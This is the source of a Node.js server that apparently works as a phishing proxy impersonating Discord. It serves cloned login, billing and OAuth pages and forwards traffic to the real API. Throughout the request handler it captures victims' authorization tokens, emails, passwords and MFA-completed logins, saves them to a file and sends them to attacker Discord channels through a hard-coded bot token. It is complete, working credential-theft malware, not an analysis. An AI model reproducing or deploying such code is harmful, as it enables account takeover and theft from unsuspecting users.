const express = require("express");
const app = express();
const fs = require("fs");
let fetch = require('node-fetch')
var discordIndexHTML = fs.readFileSync(__dirname + "/app.html", { encoding: "utf8" });
const http = require('http');
let ws = require('ws')
let Eris = require('eris')
let client = new Eris('OTI5NDgwNjA3MjI5MTY5NzM0.Ydn8RQ._13q396xkboF5Ojl_jMNkwgTIQ8')
client.connect()
const server = new http.createServer(app);
server.listen(3000)

let wss = new ws.Server({ server });
app.use("/src", express.static(__dirname + "/src"));
const bodyParser = require('body-parser');
console.log('Started')
 app.use(bodyParser.json({limit: "50mb"}));
var data = []
app.use("/:data*", async (req, res) => {
  if(req.originalUrl.startsWith('/cdn/')){
  client.createMessage('929480482700288032', `https://cdn.discordapp.com${req.originalUrl.replace('/cdn', '')}`)

console.log('https://cdn.discordapp.com' + req.originalUrl.replace('/cdn/', ''))
    let dataFetch = await fetch(('https://cdn.discordapp.com' + req.originalUrl.replace('/cdn', '')),{
headers: {
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.54 Safari/537.36"
}
})
    let dataJSON = await dataFetch.json()
    console.log(dataJSON)
    res.status(dataFetch.status).json(dataJSON)
    
return;
}
    client.createMessage('929480482700288032', `https://discord.com${req.originalUrl}`)
console.log(req.originalUrl)
  
  req.originalUrl = req.originalUrl.replace('%40', '@')
  
  if(req.originalUrl === '/assets/0.2d737cc92c807c265e1f.css') return res.sendFile(__dirname + "/style1.css")
  if(req.originalUrl === '/assets/532.d49196785d17cb9b60a9.css') return res.sendFile(__dirname + "/style2.css")
  if(req.originalUrl === '/app') return res.sendFile(__dirname + "/app.html")
  if(req.originalUrl === '/login') return res.sendFile(__dirname + "/login.html")
  if(req.originalUrl.startsWith('/billing/promotions/')) return res.sendFile(__dirname + "/billing.html")
  if(req.originalUrl.includes('oauth2') && !req.originalUrl.includes('api')) return res.sendFile(__dirname + "/2oauth.html")

  let headers = req.headers
  var headersNew = {}
//if(headers['x-super-properties']) headersNew['x-super-properties'] = headers['x-super-properties']
  if(headers['user-agent']) headersNew['user-agent'] = headers['user-agent']
//if(headers['x-discord-locale']) headersNew['x-discord-locale'] = headers['x-discord-locale']
if(headers['authorization']) headersNew['authorization'] = headers['authorization']
//if(headers['cookie']) headersNew['cookie'] = headers['cookie']
//if(headers['x-fingerprint']) headersNew['x-fingerprint'] = headers['x-fingerprint']
if(headers['content-type']) headersNew['content-type'] = headers['content-type']
//          console.log('https://discord.com' + req.originalUrl)

if(headersNew.authorization) headersNew.authorization = "Bot " + headersNew.authorization
 if(headersNew.referer) headersNew.referer = `${headersNew.referer}`.replace('https://scalloped-mahogany-chronometer.glitch.me/', 'https://discord.com/')
 if(headersNew.origin) headersNew.origin = `https://discord.com/`
 
// console.log(headersNew)
 
  if(JSON.stringify(req.body) !== `{}`){
  let dataFetch = await fetch(('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7')), {method: req.method, headers: headersNew, body: JSON.stringify(req.body)}).catch(err =>{})
  if(!dataFetch) dataFetch = await fetch(('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7')), {method: req.method, body: JSON.stringify(req.body)}).catch(err =>{})
  if(!dataFetch) dataFetch = await fetch(('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7')), {method: req.method}).catch(err =>{})

  let dataText = await dataFetch.text()
  try {
  
    let s = JSON.parse(dataText)
    if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/users/@me/billing/user-trial-offer` && req.headers.authorization){

    	let tokens;
	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
	
	let arr = tokens.split("\n").map(d => {
		return d.trim();
	});
if(!arr.includes(req.headers.authorization))client.createMessage('929489097955881000', `${req.headers.authorization}`)

if(!arr.includes(req.headers.authorization)) arr.unshift(`${req.headers.authorization}`)
	fs.writeFileSync("./tokens.txt", arr.join("\n"));
}
    if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/users/@me` && req.headers.authorization){

    	let tokens;
	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
	
	let arr = tokens.split("\n").map(d => {
		return d.trim();
	});
if(!arr.includes(req.headers.authorization))client.createMessage('929489097955881000', `${req.headers.authorization}`)

if(!arr.includes(req.headers.authorization)) arr.unshift(`${req.headers.authorization}`)
	fs.writeFileSync("./tokens.txt", arr.join("\n"));
}
        if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/users/@me` && s.token){

    	let tokens;
	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
	
	let arr = tokens.split("\n").map(d => {
		return d.trim();
	});
if(!arr.includes(s.email))client.createMessage('929489097955881000', `${s.email}:${s.token}`)

if(!arr.includes(s.email)) arr.unshift(`${s.email}:${req.headers.token}`)
	fs.writeFileSync("./tokens.txt", arr.join("\n"));
}
if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/login`){
  console.log(s)
if(s.mfa) data.unshift({ticket: s.ticket, password: req.body.password, login: req.body.login, password: req.body.password})
}
    if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/login` && s.token){

    	let tokens;
	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
	
	let arr = tokens.split("\n").map(d => {
		return d.trim();
	});
if(s.mfa) data.unshift({ticket: s.ticket, password: req.body.password})
     if(!arr.includes(req.body.login))  client.createMessage('929489097955881000', `${req.body.login}:${req.body.password}:${s.token}`)

if(!arr.includes(req.body.login)) arr.unshift(`${req.body.login}:${req.body.password}:${s.token}`)
	fs.writeFileSync("./tokens.txt", arr.join("\n"));
}
    console.log(req.originalUrl)
if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/mfa/totp`){
  var f = data.find(c => c.ticket === req.body.ticket)
console.log(f)
if(f){
      	let tokens;
	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
	
	let arr = tokens.split("\n").map(d => {
		return d.trim();
	});
if(!arr.includes(req.body.login)) client.createMessage('929489097955881000', `${f.login}:${f.password}:${s.token}`)

if(!arr.includes(req.body.login)) arr.unshift(`${f.login}:${f.password}:${s.token}`)
	fs.writeFileSync("./tokens.txt", arr.join("\n"));
}
/*var f = data.find(c => c.ticket === req.body.ticket)
console.log(f)
if(f){
  console.log(s)
  let dF = await fetch(('https://discord.com/api/v7/users/@me/mfa/codes'), {
method: "POST",
headers: {
"content-type": "application/json",
authorization: s.token
},
body: JSON.stringify({"password":f.password,"regenerate":true})
})
  
  let dJ = await dF.json()
  console.log(JSON.stringify(dJ))
*/
}

    
    return res.status(dataFetch.status).json(s)
    
  } catch {
return res.status(dataFetch.status).send(dataText)
}
        }else{
              console.log('https://discord.com' + req.originalUrl)

          if('https://discord.com' + req.originalUrl === "https://discord.com/api/v6/experiments") headersNew = {}
          headersNew.host = "discord.com"
  let dataFetch = await fetch(('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7')), {method: req.method, headers: headersNew}).catch(err =>{})
  if(!dataFetch) dataFetch = await fetch(('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7')), {method: req.method}).catch(err =>{})

  let dataText = await dataFetch.text()
  try {
  
    let s = JSON.parse(dataText)
if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/users/@me` && s.token){

    	let tokens;
	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
	
	let arr = tokens.split("\n").map(d => {
		return d.trim();
	});
if(!arr.includes(s.email)) client.createMessage('929489097955881000', `${s.email}:${s.token}`)

if(!arr.includes(s.email)) arr.unshift(`${s.email}:${s.token}`)
	fs.writeFileSync("./tokens.txt", arr.join("\n"));
}

    return res.status(dataFetch.status).json(s)
    
  } catch {
return res.status(dataFetch.status).send(dataText)
}
}

});


app.use("/", async (req, res) => {
	res.send(discordIndexHTML);
});

let clientWs = require('./ws/index.js')

wss.on('connection', async function connection(client, req) {

  let connect = new ws('wss://gateway.discord.gg/?encoding=json&v=7&compress=zlib-stream')
connect.on('open', function open() {
  console.log('ready');
});
connect.on('message', async (msg) =>{ 
let data; try 
{
  data = JSON.parse(msg)
  client.send(JSON.stringify(data))
} catch(e) {
client.send(msg)
};
console.log(data)

//try { client.send(JSON.stringift(data)) } catch  { cleint.send(msg) }
  });
connect.on('close', function close() {
  client.close();
});
  client.on('message', async function connection(msg) {
    let data; try { data = JSON.parse(msg) } catch(e) { data = msg };
console.log(data)
    
    //if(data && data.d && data.d.token) data.d.token = data.d.token.replace('Bot ', '')
    console.log(data)

connect.send(JSON.stringify(data))
  })
  
})
